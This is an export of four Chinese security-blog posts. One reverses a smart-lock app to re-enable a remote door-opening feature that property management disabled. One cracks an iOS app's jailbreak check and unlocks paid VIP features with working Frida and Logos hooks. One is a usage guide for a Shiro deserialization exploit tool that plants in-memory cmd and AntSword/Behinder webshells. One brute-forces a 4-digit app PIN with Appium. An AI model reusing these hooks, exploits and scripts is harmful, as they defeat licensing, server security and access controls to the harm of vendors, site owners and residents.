[{"title":"当快捷指令遇上智能门锁","date":"2021-02-04T11:32:07.000Z","path":"2021/02/04/IOS-ShortCut-And-Smart-Lock/","text":"0x01 前言前段时间朋友小区换了一个智能门禁系统，户主通过一个APP进行管理，可以远程进行开锁操作。刚好这段时间在使用IOS的快捷指令操作，于是想做一个一键开门的快捷指令，直接通过快捷指令来完成开门的操作。 0x02 逆向分析首先打开APP进行抓包，发现参数中有一个加密的sign值。 sign值与其他参数都有关系，修改其他参数会提示签名验证失败，而且时间久了该数据包不可用，提示时间不正确，请调整时间。 于是接下来对APP进行逆向，分析sign值是如何生成的。APP是从APPStore上下载的，首先第一步先进行砸壳。 数据线连接越狱的手机，打开app，执行frida-ps -Ua,查看Identifier 123456frida-ps -Ua PID Name Identifier---- ------ --------------------1823 xx生活 com.xx.xxlife1808 微信 com.tencent.xin1190 邮件 com.apple.mobilemail 使用frida-ios-dump砸壳 123iproxy 2222 22cd frida-ios-dump //在dump.py中配置好账号信息python3 dump.py com.xx.xxlife//砸壳 解压得到的ipa文件，使用IDA打开Mac-O文件，在Strings window搜索appUser/login 找到后查找引用 继续查找 发现在+[LoginViewModel login:password:success:failure:]方法中调用了。 双击进入-[RequestManager POST_URLString:parameters:showIndicatior:success:failure:]方法， 在该方法中调用了-[RequestManager RSAWithDic:]方法，根据方法名可以猜出该方法是对参数进行了RSA加密。 打开-[RequestManager RSAWithDic:]方法 发现参数sign是由其他参数进行RSA加密获得的。查看加密的参数格式的话可以通过frida-trace进行hook查看。 可以对-[RequestManager convertToString:]方法或者+[RSAUtil encryptString:publicKey:]方法进行hook。 查看-[RequestManager convertToString:]方法的参数与返回值，执行 1frida-trace -U -f com.xx.xxlife -m \"-[RequestManager convertToString:]\" Ctrl-C 停止运行，修改convertToString_.js 123456789&#123; onEnter(log, args, state) &#123; log(`-[RequestManager convertToString:$&#123;args[2]&#125;]`); log(ObjC.Object(args[2])); &#125;, onLeave(log, retval, state) &#123; log(ObjC.Object(retval)); &#125;&#125; 再次运行，可以看到参数与返回值 查看+[RSAUtil encryptString:publicKey:]方法的参数与返回值，执行： 1frida-trace -U -f com.xx.xxlife -m \"+[RSAUtil encryptString:publicKey:]\" 由上面的hook可以看到加密的参数格式以及RSA的public key，接下来进行验证一下。 这里有一个问题，当使用该public key进行加密时，当加密的数据长度大于117时，会报错。 解决的方法是对加密的数据根据长度117进行分割，使用rsa加密后拼接，最后返回拼接后的数据。 修改后可以成功登录，接下来是一键开门的操作。 当使用一键开门的功能时提示该小区未开启一键开门功能 之前是可以使用该功能的，可能由于有业主频繁的开门，物业怕影响正常的使用，后来该功能就不可用了。 根据关键字定位到sub_1000B5978函数 发现是否开启一键开门功能是根据isClickOpen来判断的，当该值不为2时可以使用该功能。在操作APP的时候可以发现返回值中有isClickOpen，通过拦截数据包修改该值为非2的值，如修改为1。 再次使用一键开门功能可以正常使用。该功能发送的请求： 123456789101112POST /xxxxApi/userCommunity/IsOpenDoor HTTP/1.1Host: xxxxapp.xxxxxxx.comContent-Type: application/x-www-form-urlencodedConnection: closeAccept: */*User-Agent: PerfectLife/3.01.0 (iPhone; iOS 12.4.1; Scale/2.00)Accept-Language: zh-Hans-CN;q=1Content-Length: 545Accept-Encoding: gzip, deflateaccessToken=84379_2eb78c1f6249447a9922039f35fc1fd7&amp;applicationType=2&amp;deviceType=2&amp;houseId=xxxxx&amp;sign=ZkZMPY2OHqCWlW4s%2BXfKFs3pmMfMbO95nGZVex/j7ci2jIakkS8J8wAnq%2BcjRygDI/vsuxPgz/SNRHRXlkzoGcqyglE483PDMbVzYBdtnLtrWFmEl/APAepcgT/Vsap7kr5vhjyf73HsAMFRwd0jKLnhX/Qy04l3FIMlvEs9mW1t7FGEkfRTuCpqz8cz%2B8Db4u8h8HOvyYS1SQiKNene0gdGztNxkFGayf1hPjPOWbSCpdQ9NbkPJ/4vSrGO%2B5HfB8umHvFYeamtByHdwiQsnfzMKcFuw4fGfG6nU35xBOsS1hY%2BWyeMh6/%2BPkXW%2BcyqWjT%2BssTp5F7IZhVibF/zcA%3D%3D&amp;terminalCode=865xxxx&amp;timestamp=1611820323000&amp;version=3.01.0&amp;versionCode=3010 其中参数houseId是户主的房屋id，是固定值，与登录的用户有关。可以通过接口appUserHouse/getHouseAndFocusList获取。 参数terminalCode是小区门的编码，该值可能会变化，可以通过接口door/list获取。 返回的内容 然后就可以利用代码实现一键开门的操作 为了不影响正常使用，这里仅获取houseId与terminalCode，不进行开门操作。 接下来就是快捷指令的编写，实现一键控制。 0x03 快捷指令编写如果结合其他APP或者借助其他平台的话很容易就可以编写快捷指令，如可以使用Pythonista(需付费下载)，复制上面的python脚本，直接通过快捷指令调用，也可以通过快捷指令登录SSH运行脚本(需要有服务器)。 但对于普通用户来说这种操作不易实现（需要一定的成本），这里采取了一种稍微繁琐的方法，但都尽量采用快捷指令来实现（或者借助免费的应用来实现）。 以登录过程为例，进行快捷指令的编写。 登录过程所需的参数： 参数名称 说明 accessToken 登录时为空 applicationType 当前环境下固定值2 deviceType 当前环境下固定值2 password 密码 phone 手机号 sign 对其他参数进行RSA加密获取 timestamp 当前时间的时间戳 version 当前版本3.01.0 versionCode 当前版本3010 其中时间戳和RSA加密的sign值需要去获取，获取时间戳可以通过快捷指令来实现。 RSA加密的话，本来可以借助在线平台来实现，但是由于使用该APP的Public key进行加密时，待加密字符串长度大于117时会报错。 使用截取字符串的话快捷指令没有截取文本，只有一个根据条件拆分字符，所以这里打算借助其他APP通过执行JavaScript脚本来实现。这里采用的APP是JSBOX，虽然该APP有很多功能，但是都需要高级版才可以使用。不过免费版可以通过快捷指令来执行JavaScript脚本。 JS实现RSA加密可以使用jsencrypt ，主要代码： 12345678910111213141516171819/**省略jsencrypt代码**/var PUBLIC_KEY = 'MIGfMA0GCSqGSI......7nNQIDAQAB';var encrypt = new JSEncrypt();encrypt.setPublicKey('-----BEGIN PUBLIC KEY-----' + PUBLIC_KEY + '-----END PUBLIC KEY-----');var str = '待加密字符串';var divide = parseInt(str.length / 117);if (divide &gt; 0)&#123;divide=divide;&#125; else divide=divide + 1;var line = divide ;if(str.length % 117 != 0)&#123; line = divide + 1;&#125;var encrypted = '' ;for(var i = 0;i&lt;line ;i++)&#123; encrypted += b64tohex(encrypt.encrypt(str.substring(i*117,(i+1)*117)));&#125;var result = hex2b64(encrypted);result; RSA加密的快捷指令 这样借助JSBOX运行JavaScript来实现RSA加密就完成了，剩下的就好做了。 一个快捷指令可以看作是程序里的一个函数，可以在其他快捷指令中来调用。使用快捷指令的的登录过程如下： 登录成功返回accessToken，然后在其他操作中需要使用该token。其他的操作都类似，先在快捷指令中调用登录，然后请求相关的api即可。如开门的快捷指令如下： 使用的话可以直接点击开东门的快捷指令，或者使用语音嘿Siri，开东⻔来开启小区入口门。开启其他大门类似，修改对应的terminalCode即可。 给别人使用的话也很简单，通过快捷指令Backup Shortcuts To iCloud将所需的快捷指令共享给别人，然后下载JSBOX即可使用。 0x04 总结本文通过快捷指令实现了一个”智能开门”指令，快捷指令实现起来比较简单，但是功能有限制，有些功能需要借助一下其他的APP或者平台才能实现，本文为了大众化才采用了比较繁琐的方法来实现，如果是自己使用的话当然是怎么方便怎么来。","tags":[{"name":"IOS逆向","slug":"IOS逆向","permalink":"https://fuping.site/tags/IOS%E9%80%86%E5%90%91/"},{"name":"快捷指令","slug":"快捷指令","permalink":"https://fuping.site/tags/%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4/"}]},{"title":"IOS逆向初探","date":"2020-12-16T07:02:10.000Z","path":"2020/12/16/IOS-APP-tomatodo-Cracked/","text":"0x00 前言本文记录了某次逆向一个简单APP的过程，来简单介绍一下IOS逆向的流程，比较基础，属于入门级教程。包括砸壳、HOOK、插件的编写等一系列流程。 0x01 背景前段时间在一个老师那里看到一群考研人的打卡信息，该APP能够详细的记录和分析学习过程。 于是就下载试用了一下。但是免费版有许多的限制。如免费版的话仅可以添加2个”习惯”类代办， 使用背景图也是需要开通季度卡的（虽然并没什么用）。 手机上打开”季度卡”页面，由于手机经过了越狱，在开通的时候提示非常抱歉，由于Apple的安全策略，暂不支持越狱用户购买，可点击右上角获取帮助-其他问题联系我们解决。 虽然免费版不影响正常使用，但是本着学习的态度想查看一下其越狱检测的绕过，结果发现竟然可以白嫖使用VIP功能。 0x02 逆向分析IOS下逆向常规操作判断该APP是否加壳(加密)，有壳的话先进行砸壳，然后利用IDA或者Hopper对脱壳后的Mach-O文件进行分析。首先需要准备一下环境和工具。 1.准备工作手机设备：一台越狱的IOS手机，版本为12.4.1，安装了OpenSSH和Frida，Frida版本为14.1.3。 逆向分析工具：IDA或者Hopper。 开发工具：Xcode。 抓包工具：BurpSuite 或者Charles。 电脑上安装Frida版本为14.1.3。 由于是APPStore下载的APP，是经过了加壳的。接下来开始对该APP进行砸壳。 2. 砸壳砸壳的脚本有很多，如frida-ios-dump、dumpdecrypted、Clutch、yacd等，这里采用的工具是frida-ios-dump。 安装方法： 123git clone https://github.com/AloneMonkey/frida-ios-dumpcd frida-ios-dumppip install -r requirements.txt --upgrade 安装完成所需的依赖后打开dump.py进行配置。 12345User = 'root'Password = 'alpine'#默认的密码Host = 'localhost'Port = 2222 #根据自己的端口进行修改KeyFileName = None 使用方法: python3 dump.py APP名字 或者python3 dump.py Bundle identifier 将手机与电脑连接，打开APP，执行frida-ps -Ua,查看APP名字和Identifier。 1234frida-ps -Ua PID Name Identifier---- ------ --------------------7312 APP名字 com.xxxx.tomatodo 然后进行砸壳 12iproxy 2222 22python3 dump.py com.xxxx.tomatodo 也可以执行python3 dump.py APP名字进行砸壳 砸了壳后提取出TomatoTime可执行文件，扔到IDA或者Hopper里面分析。 3.分析根据关键文字进行搜索，这里搜索的是”越狱”。由于Mac上的IDA7.0搜不出来中文字符，所以可以使用Hopper搜索，找到函数位置后使用IDA打开。也可以全程使用Hopper进行分析。 使用hopper搜索”越狱”字符串 发现是在方法startPay:中 找到后可以继续使用Hopper进行分析，或者在IDA中分析，我在这里采用了IDA。 直接在函数中搜索-[SeasonCardController startPay:]。 发现是该APP判断是否越狱，是根据是否存在Cydia来进行判断的。当/Applications/Cydia.app文件存在时，则提示用户越狱。 绕过这种越狱检测的方法也很简单，直接进行Hook fileExistsAtPath:方法即可。当判断/Applications/Cydia.app文件存在时将返回值改为0，即可绕过这里的越狱判断。 4. 越狱绕过根据上面的分析，开始对-[NSFileManager fileExistsAtPath:]进行Hook。 代码如下： 1234567891011121314151617181920var jailbreakPaths = [\"/Applications/Cydia.app\"];var isJailBreakChecked = falseInterceptor.attach(ObjC.classes.NSFileManager[\"- fileExistsAtPath:\"].implementation, &#123; onEnter: function (args) &#123; isJailBreakChecked = false; this.path = new ObjC.Object(args[2]).toString(); // check if the looked up path is in the list of common_paths if (jailbreakPaths.indexOf(this.path) &gt; -1) &#123; console.log(\"fileExistsAtPath: check for -&gt; \" + this.path); isJailBreakChecked = true; &#125; &#125;, onLeave: function (retval) &#123; if (!isJailBreakChecked) &#123; return; &#125; console.log(\"change before:\"+retval); retval.replace(0);//当判断/Applications/Cydia.app文件存在时将返回值改为0 console.log(\"change after:\" + retval); &#125;&#125;); 执行方法： 1frida -U -l tomatodo-jailbreak-bypass.js -f com.xxxx.tomatodo --no-pause 此时再次打开APP，可以成功进入季度卡开通界面。 当然也可以使用objection进行绕过越狱检测。 使用方法 1objection -g &quot;com.xxxx.tomatodo&quot; explore --startup-command &quot;ios jailbreak disable&quot; 也是可以成功绕过越狱检测的。 5.Vip功能绕过在-[SeasonCardController startPay:]方法中有第53行这样一个判断，根据意思应该是判断是否激活。 根据上面的代码，猜测+[CommonUtil isActive]的结果是判断是否开通了季度卡的依据。在这里使用frida-trace进行追踪，frida-trace 用于跟踪函数或者 Objective-C 方法的调用，-m 跟踪某个 Objective-C 方法。 使用方法： 1frida-trace -U -f com.xxxx.tomatodo -m \"+[CommonUtil isActive]\" 它会在当前目录下生成一个 __handlers__目录，然后在目录下生成一个 类名/方法名.js 文件，这里的文件名为/CommonUtil/isActive.js。当在调用该方法时，会输出以下信息，按 Ctrl-C 可以停止跟踪。 打开生成的js文件会看到有两个函数，onEnter 是进入该函数时会执行的代码，onLeave 是该函数执行完离开时会执行的代码。在这里直接修改返回值retval为1。其代码如下： 12345678910&#123; onEnter(log, args, state) &#123; log(`+[CommonUtil isActive]`); &#125;, onLeave(log, retval, state) &#123; console.log(\"change before:\"+retval); retval.replace(1); console.log(\"change after:\"+retval); &#125;&#125; 再次执行 frida-trace，/CommonUtil/isActive.js 文件不会覆盖，会执行刚才添加好的代码，如下： 此时发现不仅可以使用季度卡背景 而且也可以可以添加多个习惯类代办 其实并不是，在测试的时候由于没有注意，添加了两个习惯和一个目标，导致认为通过hook +[CommonUtil isActive]方法可以解锁全部的VIP功能，一直到后来写插件的时候才发现该错误，在编写非越狱插件时有详细的分析。 所以通过hook方法 +[CommonUtil isActive]可以实现到VIP功能的使用。 但这些都是在越狱手机上使用的，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。 0x03 编写非越狱插件编写插件采用了非越狱插件开发集成神器MonkeyDev，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。 安装和卸载可以参考https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85 安装完成后新建MonkeyApp 输入项目名称 项目建立后将砸壳后的APP拖入到TargetApp目录下。 这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法： 123456%hook 类名- (返回值)方法名:(id)arg1 ....&#123; ...&#125;%end 这里我们需要对CommonUtil 类的方法isActive进行HOOK，修改返回值，代码如图所示。 连接非越狱手机后使用⌘+R运行该项目，手机上会多出来一个名字一样的APP。理论上来讲该APP可以使用其VIP功能。 首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书。 然而此时只能使用VIP的部分功能，可以使用会员背景，但是无法添加超过2个习惯和目标类代办。此时才发现在使用frida进行hook的时候，测试添加多个习惯类代办时添加了两个习惯，一个目标，因此给出了可以使用全部VIP功能的结论。 通过关键字定位到-[AddTodoController confirm]方法。 发现添加超过2个习惯和目标类代办需要判断GVUserDefaults的isActive是否为真。 而且查看+[CommonUtil isActive]方法，其返回结果也是获取的GVUserDefaultsisActive属性的值。 对+[GVUserDefaults standardUserDefaults]进行hook，修改其isActive属性。 代码如下： 1234567891011121314@interface GVUserDefaults : NSObject@property(nonatomic) _Bool isActive;@end%hook GVUserDefaults+ (id)standardUserDefaults&#123; GVUserDefaults *gvUser = %orig(); NSLog(@\"GVUserDefaults isActive old----&gt;%d\",[gvUser isActive]); [gvUser setIsActive:true]; NSLog(@\"GVUserDefaults isActive new----&gt;%d\",[gvUser isActive]); return gvUser;&#125;%end 执行结果 此时可以使用超过2个习惯和目标类以及使用全部的背景功能。 0x04 总结本文通过一个简单的APP逆向，实现了越狱绕过以及解锁VIP会员功能。简单的介绍了一下相关工具的使用。关于越狱绕过，该APP越狱检测的方法很简单，只是判断了文件是否存在。其他检测的方式有：可以尝试读取系统所有的应用名称列表，看有无权限获取；检测stat是否出自系统库等。更多检测方式可以参考iOS开发-安全相关-越狱检测 。 对于该APP使用体验来讲，免费版功能已经够用了，而且无广告，如果有需要的可以开通季度卡，解锁更多功能。","tags":[{"name":"IOS逆向","slug":"IOS逆向","permalink":"https://fuping.site/tags/IOS%E9%80%86%E5%90%91/"},{"name":"frida","slug":"frida","permalink":"https://fuping.site/tags/frida/"}]},{"title":"ShiroExploit使用指南","date":"2020-11-27T05:55:56.000Z","path":"2020/11/27/ShiroExploit-Readme/","text":"0x01 简介一款关于Shiro 1.2.4反序列化漏洞利用的回显工具。最新版本为v2.4。 v2.4与v2.3相差不大，使用v2.3即可。 v2.3下载地址：https://github.com/fupinglee/JavaTools/blob/master/Shiro/ShiroExploit-v2.3.jarv2.3使用说明：https://github.com/fupinglee/JavaTools/blob/master/Shiro/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E-v2.3.pdf 支持： 1.支持Tomcat7、Tomcat8、Tomcat9下的回显。 2.支持Tomcat7、Tomcat8、Tomcat9下内存cmd马的写入与卸载。 执行成功访问的URL为http://ip:port/xxx?labCmd=[命令]&amp;pwd=[密码]。 3.支持Tomcat7、Tomcat8、Tomcat9下蚁剑内存shell的写入与卸载(请用蚁剑连接，连接类型CUSTOM)。 执行成功后连接的URL为http://ip:port/xxx?ver=[任意字符串]。 4.支持Tomcat7、Tomcat8、Tomcat9下冰蝎内存shell的写入与卸载(请用蚁剑连接，连接类型JSP)。 执行成功后连接的URL为http://ip:port/xxx。 5.新增配置中心，支持自定义UA和x-forwarded-for；新增内存代理Tunnel，新增AES-GCM加密方式的支持，新增一键卸载所有内存SHELL。 以上发送请求时均需带上自定义的header：Accept-Header:[自定义的Accept-Header内容] 下面具体说一下各个功能的使用方法，主要是介绍命令执行的使用方法。 0x02 使用说明一共有三个功能模块，分别是KEY检测、命令执行和配置中心。 KEY检测 这一部分功能说明可以参考https://github.com/fupinglee/ShiroScan。 新增AES-GCM加密方式。 命令执行命令执行中一共有回显、内存shell和卸载这三块。 回显输入正确的key，选择正确的Gadget即可。支持Tomcat6、7、8、9以及SpringBoot下的通用回显。 内存shell这个一共有6个选择，分别是CMDSHELL、EvilObject、[蚁剑]蚁剑SHELL、[蚁剑]冰蝎SHELL、[蚁剑]冰蝎SHELL[SpringBoot]、Tunnel。 常用的有CMDSHELL、[蚁剑]蚁剑SHELL、[蚁剑]冰蝎SHELL、[蚁剑]冰蝎SHELL[SpringBoot]、Tunnel 5个，EvilObject在这里只是为了写入蚁剑SHELL和Tunnel而用的，暂时没有单独使用的机会，所以这里就不对其进行功能介绍了。 内存Shell都是采用的Filter，因此连接或者使用时，可以使用任意路径，只需配置好指定的Header与密码。 1.CMDSHELL 可以自定义密码和请求头，都是必须的。 保存完毕后点击开始按钮。 执行的效果： 只有在密码、和header都正确且存在的情况下，才会执行命令，否则返回正常的页面。 2.[蚁剑]蚁剑shell 输入密码和Header保存后点击开始按钮，会将蚁剑Shell Filter加载进去 使用蚁剑连接 一共有三个需要注意的地方。 1.URL中需要有ver参数 2.连接类型为CUSTOM 3.需要添加Header，Name为Accept-Header，Value是自己设置的值 这三个都需要且正确，否则会连接不成功。 3.[蚁剑]冰蝎shella)Tomcat环境下 输入密码和Header保存后点击开始按钮，会将冰蝎Shell Filter加载进去 这里的话需要使用新版的蚁剑来连接，冰蝎是无法连接此shell的，所以类型为[蚁剑]冰蝎SHELL。 不过最新版的蚁剑也是无法连接的，需要自己从https://github.com/AntSwordProject/antSword 下载代码，然后覆盖到自己的蚁剑目录才可以，作者已经更新了代码，但是还没有发布，需要自己下载后替换文件即可。 连接冰蝎shell也需要注意三点。 1.需要从github下载代码替换蚁剑客户端 2.连接类型为JSP 3.需要添加Header，Name为Accept-Header，Value是自己设置的值 否则也是无法连接的，这里就不演示了。 b)SpringBoot环境下支持回显与冰蝎shell 连接时需要利用修改的蚁剑模版 123git clone https:&#x2F;&#x2F;github.com&#x2F;fupinglee&#x2F;AntSword-JSP-Templatecd AntSword-JSP-Template.&#x2F;build.sh https://github.com/AntSwordProject/AntSword-JSP-Template/pull/1 然后将dist下的文件替换 AntSwordData/antSword-master/source/core/jsp/template 中的文件，然后重启蚁剑客户端。 修改前连接500错误 修改后正常连接 蚁剑连接 4.Tunnel内存代理shell。 这里就不需要密码了，因此密码框是无法编辑的。 注意这里是Cache-Header 使用原版的reGeorgSocksProxy.py是无法连接的。 需要加上自定义的Cache-Header，这里是&quot;Cache-Header&quot;:&quot;thisIsMyJob!@&quot;。 也可以直接使用https://github.com/fupinglee/MyPython/blob/master/tools/reGeorgSocksProxy_MMShell.py 注意使用时需要替换自己的Cache-Header的值。 修改后运行 卸载卸载的意思就是将Filter移除掉。 这里用cmdshell为例 选择类型后确定，然后点击开始按钮 cmdshell即被卸载 新增了一键卸载的命令。 会一次将所有写入的内存shell都给卸载。 更新密码如何更新shell密码 仍以cmdshell为例，其他的一样的操作，都是重新加载一次内存shell即可。 首先加载一个cmdshell 修改密码是选择内存shell，然后选择shell类型，输入密码和自定义的header 修改密码为cmd2,原来的密码已经失效了 新的密码可以执行命令。 配置中心 配置中心可以使用代理和自定义UA、X-Forwarded-For，保存后立即生效。 在两次实例中遇到了通过修改UA或X-Forwarded-For绕过限制执行命令的情况，因此增加了这个功能。 0x03 其他仅供安全人员进行有授权的验证,勿用于非法测试。","tags":[{"name":"Shiro反序列化回显工具","slug":"Shiro反序列化回显工具","permalink":"https://fuping.site/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%B7%A5%E5%85%B7/"},{"name":"内存shell","slug":"内存shell","permalink":"https://fuping.site/tags/%E5%86%85%E5%AD%98shell/"}]},{"title":"自动化测试工具Appium初探","date":"2020-05-29T09:21:55.000Z","path":"2020/05/29/Test-Automation-Using-Appium/","text":"0x01 前言前段时间由于给小破站开启了青少年模式，结果密码给忘记了。导致只能看一些学习课堂和书法之类的相关视频。虽然有找回密码选项，但是找回密码需要发送本人手持身份证的照片。而后在输入密码的时候试了多次，除了提示”密码输入错误，请重试”外，没有其他限制，也没有网络请求。由于是4位的数字密码，我想如果我写个自动输入密码的脚本，利用生成0000~9999的密码字典，应该就可以找到正确的密码。 经搜索发现，IOS自动化的框架有很多，如UIAutomation、XCTest、KIF、APPium等。其中UIAutomation和APPium无需源码就可以进行测试，而且APPium支持多种语言，所以这里我选择了APPium。 0x02 环境搭建与自动化测试Appium相关介绍Appium 是一个开源工具，用于自动化 iOS 手机、 Android 手机和 Windows 桌面平台上的原生、移动 Web 和混合应用。 它使用WebDriver协议驱动iOS，Android和Windows应用程序。Appium 是跨平台的：它允许用同样的 API 对多平台（iOS、Android、Windows）写测试，做到在 iOS、Android 和 Windows 测试套件之间复用代码。而且支持多种语言，java、python、php、Ruby等等。 我这里是在MacOS系统下进行的测试，采用了手机版本为13.5.1（IOS真机），开发语言选择了Python3.8。 下面就开始搭建环境进行测试吧。 首先是APPium的安装。 APPium相关安装如果没有安装Homebrew，则需要先安装Homebrew。 1/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\" 安装node 1brew install node 安装相关依赖与软件 12345678910111213npm install -g appium # 安装appiumnpm install wdnpm install -g appium-doctornpm i -g mjpeg-consumerbrew install ios-deploybrew install carthagebrew install lyft/formulae/set-simulator-locationnpm i -g opencv4nodejsbrew tap facebook/fbbrew install idb-companionpip install fb-idbbrew tap wix/brewbrew install applesimutils 安装的话根据可以参考http://appium.io/docs/en/about-appium/getting-started/ 进行安装。 也可以直接安装appium桌面程序https://github.com/appium/appium-desktop/releases 。 安装后执行appium-doctor --ios指令，可以查看与iOS相关配置是否完整。 如果有哪一项是打叉的，则根据安装说明进行安装就可以了。 下图是全部配置都成功的情况。 由于需要在真机下进行测试所以还需要配置WebDriverAgent。 配置WebDriverAgent下载WebDriverAgent。 进入到WebDriverAgent目录，然后执行./Scripts/bootstrap.sh下载安装依赖库。 双击WebDriverAgent.xcodeproj使用xcode打开WebDriverAgent项目 配置WebDriverAgentLib、WebDriverAgentRunner以及IntegrationApp的开发者信息 发现有错误，接下来修改WebDriverAgentRunner和IntegrationApp的Bundle identifier。 修改后发现无报错信息。然后数据线连接真机，进行安装。 发现编译失败，将 assign 改成 unsafe_unretained ，然后重新使用command + u进行编译安装测试。 然后访问http://手机IP:8100。如http://172.20.10.1:8100/status 。 需要手机与电脑处于同一网络下，我这里为了测试，电脑连接的是手机的热点。 此时WebDriverAgent配置成功。如果在Appium中使用时，还需替换Appium中的WebDriverAgent。 我这里的路径为/Applications/Appium.app/Contents/Resources/app/node_modules/appium/node_modules/appium-xcuitest-driver/node_modules/WebDriverAgent 直接替换即可，或者直接修改Appium中的WebDriverAgent，效果一样。 接下来就是自动化脚本的编写。 自动化脚本编写可以通过使用Appium应用程序查看IOS元素特征。启动Appium，左上角菜单栏选择APPium-New Session Window...(或者快捷键command+N)。 填写对应的启动参数。 一些必要的参数： platformName是测试平台的名称，是ios或者Android。 udid在ios真机测试时需要，可以通过ios-deploy --list_bundle_id查询 bundleId需测试程序的bundle id,可以通过ios-deploy --list_bundle_id查询 配置完成后，点击Start Session，手机会自动打开哔哩哔哩APP。 可以利用xpath获取元素并进行输入、点击等一系列操作。接下来就可以通过使用Python脚本来进行自动化测试了。 需要安装appium的python依赖库。 1pip install Appium-Python-Client 启动APP的脚本如下： 1234567891011121314151617from appium import webdriver #pip install Appium-Python-Clientimport timedef main(): desired_caps = dict() desired_caps['platformName'] = 'iOS' desired_caps['platformVersion'] = '13.5.1' desired_caps['deviceName'] = 'xiamo6' desired_caps['automationName'] = 'XCUITest' desired_caps['udid'] = '8d4************a3' desired_caps['bundleId'] = 'tv.danmaku.bilianime' driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) time.sleep(5) driver.quit()if __name__ == '__main__': main() 运行效果如下： 接下来需要进入到输入密码界面，依次需要点击我的-青少年模式-修改密码（或者关闭青少年模式）。 利用脚本实现就是： 123driver.find_element_by_id(\"我的\").click()driver.find_element_by_xpath(\"//XCUIElementTypeStaticText[@name=\\\"青少年模式\\\"]\").click()driver.find_element_by_id(\"关闭青少年模式\").click() 运行效果如下 如果是已经打开app 40分钟，或者非正常时段，则直接显示的是输入密码界面。 可以利用xpath获取密码输入框元素，输入密码后并点击“立即验证”按钮，主要代码如下： 12345driver.set_value(driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[1]\"),pwd[0])driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[2]\").send_keys(pwd[1])driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[3]\").send_keys(pwd[2])driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[4]\").send_keys(pwd[3])driver.find_element_by_xpath(\"//XCUIElementTypeButton[@name=\\\"立即验证\\\"]\").click() 完整的代码如下： 1234567891011121314151617181920212223242526272829from appium import webdriver #pip install Appium-Python-Clientimport timedef main(): desired_caps = dict() desired_caps['platformName'] = 'iOS' desired_caps['platformVersion'] = '13.5.1' desired_caps['deviceName'] = 'xiamo6' desired_caps['automationName'] = 'XCUITest' desired_caps['udid'] = '8d4904454b********552e976a3' desired_caps['bundleId'] = 'tv.danmaku.bilianime' driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) for p in range(5091,10000): try: pwd = str(p) driver.set_value(driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[1]\"),pwd[0]) driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[2]\").send_keys(pwd[1]) driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[3]\").send_keys(pwd[2]) driver.find_element_by_xpath(\"//*/XCUIElementTypeStaticText[4]\").send_keys(pwd[3]) driver.find_element_by_xpath(\"//XCUIElementTypeButton[@name=\\\"立即验证\\\"]\").click() print(pwd,'error') except Exception: print(pwd,'is right') break driver.quit()if __name__ == '__main__': main() 运行效果 由上面执行的结果来看，每次输入前都会等待一会再输入，所以看起来速度很慢。 通过找到上图标记的XCUIElementTypeOther，然后使用Send Keys直接传入一个四位数字。 12driver.find_element_by_xpath(\"//*/XCUIElementTypeWindow[1]/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther\").send_keys(pwd)driver.find_element_by_xpath(\"//XCUIElementTypeButton[@name=\\\"下一步\\\"]\").click() 执行结果如图所示。 这里的动图是4倍速播放。 修改过后，发现速度确实有所提升，但是总体速度还是很慢的。经过搜索发现，有帖子说在IOS模拟器上和安卓上会快一些，由于程序无法安装到IOS模拟器，所以这里选择了在安卓设备上进行测试。 安卓环境下测试安卓的环境需要安装Android SDK、JDK、安卓模拟器(真机也可以，这里采用的是Genymotion模拟器)。安装后配置JAVA_HOME、ANDROID_HOME。 然后通过执行appium-doctor --android来查看是否配置成功，如图所示。 查看android元素信息可以使用uiautomatorviewer。位于Android SDK下的/tools/bin/目录。 启动模拟器并打开测试的APP，然后打开uiautomatorviewer。选择Device Screenshot（从左至右第二个图标）。 通过tv.danmaku.bili:id/et_code可以定位到编辑框，按钮“立即验证”可以通过tv.danmaku.bili:id/operate来定位。 这里直接贴使用安卓下自动化爆破的脚本，代码如下： 12345678910111213141516171819202122232425262728from appium import webdriverimport timedef main(): desired_caps = dict() desired_caps['platformName'] = 'Android' desired_caps['platformVersion'] = '6.0' desired_caps['deviceName'] = 'Nexus' desired_caps['appPackage'] = 'tv.danmaku.bili' desired_caps['appActivity'] = 'ui.splash.SplashActivity' desired_caps['noReset'] = True desired_caps['automationName'] = 'UiAutomator2' driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) for pwd in range(4011,10000): try: driver.find_element_by_id('tv.danmaku.bili:id/et_code').send_keys(pwd) driver.find_element_by_id(\"tv.danmaku.bili:id/operate\").click() print(pwd,'error') except Exception: print(pwd,'is right') break time.sleep(4) driver.quit()if __name__ == '__main__': main() 运行效果如图所示 对比之下，在Android下的效率是很快的。而且经过测试，安卓破解100次，耗时约139.14s，而ios破解50次，耗时约262.56s。 所以最后我采用了安卓环境下进行破解，最终成功跑出了密码。 已经成功找到密码4578。 0x03 思考由于输入密码的时候并没有发生网络请求，猜测密码应该保存在本地。一般情况下本地存储采用sqlite数据库或者是SharePreferences中。 先查看SharePreferences中的文件，进入/data/data/tv.danmaku.bili/shared_prefs目录。 发现文件bili_teenagers_mode_preferences20449166.xml，根据文件名发现文件就是和青少年模式有关的配置文件。查看里面的内容 发现一串神秘字符串，通过cmd5查询：c2890d44d06bafb6c7b4aa194857ccbc=md5(4578)。正好是设置的密码。 